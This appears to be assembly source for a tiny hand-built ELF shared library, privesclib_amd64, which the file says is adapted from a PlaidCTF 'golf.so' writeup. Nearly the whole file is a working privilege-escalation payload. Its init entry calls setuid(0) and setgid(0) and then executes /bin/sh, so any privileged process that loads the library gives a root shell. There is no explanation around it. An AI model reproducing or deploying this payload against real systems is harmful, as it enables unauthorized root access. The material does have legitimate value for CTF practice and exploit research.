; nasm -f bin -o privesclib_amd64 privesclib_amd64.asm
; Based on the PlaidCTF TeamRocket writeup: https://teamrocketist.github.io/2020/04/20/Misc-PCTF2020-golf-so/
BITS 64
org     0
ehdr:
  db    0x7f, "ELF", 2, 1, 1, 0    ; e_ident
  db    0, 0, 0, 0,  0, 0, 0, 0
  dw    3                          ; e_type    = ET_DYN
  dw    62                         ; e_machine = EM_X86_64
  dd    1                          ; e_version = EV_CURRENT
  dq    _start                     ; e_entry   = _start
  dq    phdr - $$                  ; e_phoff
  dd    phdr - $$                  ; e_shoff (chaged to phdr instead of shdr)
  dq    0                          ; e_flags
  dw    ehdrsize                   ; e_ehsize
  dw    phdrsize                   ; e_phentsize
  dw    2                          ; e_phnum
ehdrsize equ  $ - ehdr
phdr:
  dd    1                          ; p_type   = PT_LOAD
  dd    7                          ; p_flags  = rwx
  dq    0                          ; p_offset
  dq    $$                         ; p_vaddr
  dq    $$                         ; p_paddr
  dq    0x68732f6e69622f           ; p_filesz /bin/sh
  dq    0xFFFFFFFF                 ; p_memsz arbitrary
  dq    0x1000                     ; p_align
phdrsize equ  $ - phdr
  dd    2                          ; p_type  = PT_DYNAMIC
  dd    7                          ; p_flags = rwx
dynsection:
; DT_STRTAB
  dq    0x5                        ; p_offset (OVERLAPPED)
  dq    dynsection                 ; p_vaddr
; DT_INIT
  dq    0x0c
  dq    _start
; DT_SYMTAB
  dq    0x06
  dq    _start
global _start
_start:
  mov r15,rax 			   ; setuid(0)
  push 105
  pop  rax
  xor  edi, edi
  syscall
  push 106                         ; setgid(0)
  pop  rax
  syscall
  mov rax,r15
  lea rdi,[rax-0x50]
  push 59
  pop rax
  push 0
  push rdi
  mov rsi,rsp
  cdq
  syscall
